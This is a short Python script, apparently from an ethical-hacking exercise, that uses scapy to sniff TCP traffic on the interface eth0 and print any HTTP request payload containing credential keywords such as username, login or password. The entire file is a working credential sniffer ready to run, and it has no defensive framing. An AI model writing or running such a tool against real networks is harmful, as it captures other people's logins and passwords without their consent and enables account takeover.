#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet, filter="tcp")  # prn= callback
    # available filters
    # bps syntax https://biot.com/capstats/bpf.html
    # port 21
    # udp
    # tpc


def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load
            keywords = ['username', 'uname', 'uid', 'user', 'email', 'mail', 'userid', 'id', 'login', 'password', 'pass']
            for word in keywords:
                if word in payload:
                    print(payload)
                    break


sniff("eth0")
